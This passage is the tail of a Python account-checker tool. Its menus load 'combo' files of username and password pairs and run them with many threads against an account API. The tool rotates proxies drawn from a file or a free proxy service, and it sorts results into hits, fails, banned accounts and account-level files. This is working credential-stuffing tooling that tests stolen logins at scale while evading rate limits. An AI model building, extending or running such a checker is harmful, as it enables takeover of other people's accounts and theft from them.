            except Exception as e:
                print(f"{Fore.RED}Error moving {file_path}: {str(e)}{Style.RESET_ALL}")
    
    if moved_count == 0:
        print(f"{Fore.YELLOW}No result files found to move.{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.GREEN}Successfully moved {moved_count} result files!{Style.RESET_ALL}")

def clear_results():
    """Clear all result files."""
    config = load_config()
    save_paths = config.get("save_path", DEFAULT_CONFIG["save_path"])
    
    files_to_clear = [
        save_paths['hits'],
        save_paths['fails'],
        save_paths['levels']['below30'],
        save_paths['levels']['30to50'],
        save_paths['levels']['51to89'],
        save_paths['levels']['90to100'],
        save_paths['levels']['above100'],
        save_paths['banned']
    ]
    
    cleared_count = 0
    for file_path in files_to_clear:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                cleared_count += 1
                print(f"{Fore.GREEN}Cleared: {file_path}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error clearing {file_path}: {str(e)}{Style.RESET_ALL}")
    
    if cleared_count == 0:
        print(f"{Fore.YELLOW}No result files found to clear.{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.GREEN}Successfully cleared {cleared_count} result files!{Style.RESET_ALL}")

def configure_proxy():
    """Configure proxy settings."""
    config = load_config()
    proxy_config = config.get("proxy", DEFAULT_CONFIG["proxy"])
    
    while True:
        clear_screen()
        print_banner()
        print(f"\n{Fore.CYAN}Current Proxy Configuration:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Enabled: {Style.RESET_ALL}{proxy_config['enabled']}")
        print(f"{Fore.YELLOW}Proxy File: {Style.RESET_ALL}{proxy_config['file']}")
        print(f"{Fore.YELLOW}Proxy Type: {Style.RESET_ALL}{proxy_config['type']}")
        print(f"{Fore.YELLOW}Auth Username: {Style.RESET_ALL}{proxy_config['auth']['username']}")
        print(f"{Fore.YELLOW}Auth Password: {Style.RESET_ALL}{'*****' if proxy_config['auth']['password'] else 'Not set'}")
        
        options = [
            "Toggle Proxy (Enable/Disable)",
            "Set Proxy File",
            "Set Proxy Type",
            "Configure Proxy Authentication",
            "View Proxy Configuration",
            "Save and Exit"
        ]
        
        option, _ = pick(options, "Choose an option:", indicator="→")
        
        if option == "Toggle Proxy (Enable/Disable)":
            proxy_config['enabled'] = not proxy_config['enabled']
            print(f"{Fore.GREEN}Proxy set to {proxy_config['enabled']}.{Style.RESET_ALL}")
            input("Press Enter to continue...")
            
        elif option == "Set Proxy File":
            print(f"\n{Fore.CYAN}Enter path to proxy file (one proxy per line):{Style.RESET_ALL}")
            file_path = input().strip()
            if file_path and os.path.exists(file_path):
                proxy_config['file'] = file_path
            else:
                print(f"{Fore.RED}Invalid file path!{Style.RESET_ALL}")
                input("Press Enter to continue...")
                
        elif option == "Set Proxy Type":
            proxy_types = ['http', 'socks4', 'socks5']
            type_option, _ = pick(proxy_types, "Select proxy type:", indicator="→")
            proxy_config['type'] = type_option
            
        elif option == "Configure Proxy Authentication":
            print(f"\n{Fore.CYAN}Enter proxy username (leave empty for no auth):{Style.RESET_ALL}")
            username = input().strip()
            if username:
                print(f"{Fore.CYAN}Enter proxy password:{Style.RESET_ALL}")
                password = input().strip()
                proxy_config['auth']['username'] = username
                proxy_config['auth']['password'] = password
            else:
                proxy_config['auth']['username'] = ""
                proxy_config['auth']['password'] = ""
                
        elif option == "View Proxy Configuration":
            clear_screen()
            print_banner()
            print("\nCurrent Proxy Configuration:\n")
            print(f"Status: {Fore.GREEN + 'Enabled' + Style.RESET_ALL if proxy_config['enabled'] else Fore.RED + 'Disabled' + Style.RESET_ALL}")
            print(f"Proxy Type: {proxy_config['type'].upper()}")
            print(f"Proxy File: {proxy_config['file'] or 'Not set'}")
            print("\nAuthentication:")
            if proxy_config['auth']['username'] or proxy_config['auth']['password']:
                print(f"Username: {proxy_config['auth']['username']}")
                print(f"Password: {'*' * len(proxy_config['auth']['password']) if proxy_config['auth']['password'] else 'Not set'}")
            else:
                print("No authentication configured")
            
            input("\nPress Enter to continue...")
            
        elif option == "Save and Exit":
            config['proxy'] = proxy_config
            save_config(config)
            print(f"\n{Fore.GREEN}Proxy configuration saved!{Style.RESET_ALL}")
            break
            
        else:
            print("\nInvalid choice. Please try again.")
            input("\nPress Enter to continue...")
            
def get_next_proxy(config):
    """Get the next proxy from the proxy file or from gimmeproxy.com API."""
    global proxy_list
    
    try:
        # Load proxies if not loaded
        if not proxy_list and config['proxy']['enabled'] and config['proxy']['file'] and os.path.exists(config['proxy']['file']):
            with open(config['proxy']['file'], 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
                
        if proxy_list:
            with proxy_lock:
                # Get a random proxy from the list
                proxy = random.choice(proxy_list)
                
                # Create proxy data structure
                proxy_data = {
                    "url": proxy,
                    "type": config['proxy']['type']
                }
                
                # If credentials are provided, add them to the proxy config
                if config['proxy']['auth']['username'] and config['proxy']['auth']['password']:
                    proxy_data["username"] = config['proxy']['auth']['username']
                    proxy_data["password"] = config['proxy']['auth']['password']
                
                return proxy_data
                
        # If no proxy file or it's empty, use gimmeproxy.com API
        response = requests.get(
            "https://gimmeproxy.com/api/getProxy",
            params={
                "protocol": config['proxy'].get('type', 'http'),
                "supportsHttps": "true",
                "get": "true",
                "post": "true"
            },
            timeout=10
        )
        
        if response.status_code == 200:
            proxy_data = response.json()
            if proxy_data.get("ipPort"):
                # Format proxy data
                proxy_data = {
                    "url": proxy_data["ipPort"],
                    "type": proxy_data["protocol"]
                }
                return proxy_data
                
        print(f"{Fore.YELLOW}Warning: No proxies available{Style.RESET_ALL}")
        return None
            
    except Exception as e:
        print(f"{Fore.RED}Error loading proxy: {str(e)}{Style.RESET_ALL}")
        return None

def main():
    while True:
        clear_screen()
        print_banner()
        
        options = [
            "Start Checking",
            "Combo Editor",
            "Update API Key",
            "View API Key Info",
            "Update Base URL",
            "Update Save Paths",
            "Clear Results",
            "Move Results",
            "Configure Proxy",
            "Exit"
        ]
        
        option, _ = pick(options, "Choose an option:", indicator="→")
        
        if option == "Start Checking":
            # Load or create config
            config = load_config()
            
            # Get API key if not set
            if not config["api_key"]:
                config["api_key"] = input(f"{Fore.CYAN}Please enter your API key: {Style.RESET_ALL}").strip()
                save_config(config)

            # Interactive menu for options
            print(f"\n{Fore.CYAN}Setting up checker options...{Style.RESET_ALL}")
            
            # Get combo file
            combo_file = get_combo_file()
            
            # Get thread count
            thread_count = get_thread_count()
            
            # Get check mode
            check_info = get_check_mode()

            clear_screen()
            print_banner()
            
            # Load combos
            try:
                combos = load_combo_file(combo_file)
                print(f"{Fore.CYAN}Loaded {len(combos)} combos from {combo_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error loading combo file: {str(e)}{Style.RESET_ALL}")
                sys.exit(1)

            # Initialize client and counter
            client = MTClient(api_key=config["api_key"], base_url=config["base_url"])
            counter = ResultCounter()

            # Show selected options
            print(f"\n{Fore.YELLOW}Selected Options:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Combo File: {Style.RESET_ALL}{combo_file}")
            print(f"{Fore.CYAN}Threads: {Style.RESET_ALL}{thread_count}")
            print(f"{Fore.CYAN}Mode: {Style.RESET_ALL}{'Detailed Info' if check_info else 'Basic Check'}")
            
            # Confirm start
            input(f"\n{Fore.GREEN}Press Enter to start checking...{Style.RESET_ALL}")
            
            # Start checking
            print(f"\n{Fore.CYAN}Starting check with {thread_count} threads...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Press Ctrl+C to stop checking{Style.RESET_ALL}\n")
            
            stop_event = threading.Event()
            
            def signal_handler(signum, frame):
                print(f"\n{Fore.YELLOW}Stopping... Please wait for current checks to finish...{Style.RESET_ALL}")
                stop_event.set()
            
            # Register Ctrl+C handler
            signal.signal(signal.SIGINT, signal_handler)
            
            try:
                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    futures = []
                    
                    def check_with_stop(combo):
                        if stop_event.is_set():
                            return
                        try:
                            return check_account(client, combo, counter, check_info, config)
                        except Exception as e:
                            print(f"{Fore.RED}Thread error: {str(e)}{Style.RESET_ALL}")

                    # Submit all tasks
                    for combo in combos:
                        if stop_event.is_set():
                            break
                        future = executor.submit(check_with_stop, combo)
                        futures.append(future)

                    # Wait for completion or interrupt
                    try:
                        # Use as_completed with timeout to allow checking stop_event
                        for future in as_completed(futures):
                            if stop_event.is_set():
                                # Cancel remaining futures
                                for f in futures:
                                    f.cancel()
                                break
                            try:
                                future.result()
                            except Exception as e:
                                if not stop_event.is_set():
                                    print(f"{Fore.RED}Thread error: {str(e)}{Style.RESET_ALL}")

                    except KeyboardInterrupt:
                        stop_event.set()
                        # Let the first handler deal with the shutdown

            except Exception as e:
                print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
            finally:
                # Always show stats when exiting
                if stop_event.is_set():
                    print(f"\n{Fore.YELLOW}Checker stopped by user.{Style.RESET_ALL}")
                    
                print(f"\n{Fore.YELLOW}{'=' * 30}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Check Complete! Statistics:{Style.RESET_ALL}")
                print(counter)
                print(f"{Fore.YELLOW}{'=' * 30}{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                
                # Ask user if they want to move results
                if counter.hits > 0:  # Only ask if there are hits
                    options = ['Yes', 'No']
                    option, _ = pick(options, "Would you like to move the results to a different location?:", indicator="→")
                    if option == 'Yes':
                        move_results()
                
                input(f"\n{Fore.CYAN}Press Enter Back To Menu...{Style.RESET_ALL}")
        elif option == "Update API Key":
            update_api_key()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "View API Key Info":
            view_api_key_info()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Update Base URL":
            update_base_url()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Update Save Paths":
            update_save_paths()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Clear Results":
            clear_results()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Move Results":
            move_results()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Configure Proxy":
            configure_proxy()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif option == "Combo Editor":
            combo_editor_menu()
        else:
            print(f"\n{Fore.YELLOW}Goodbye!{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    main()
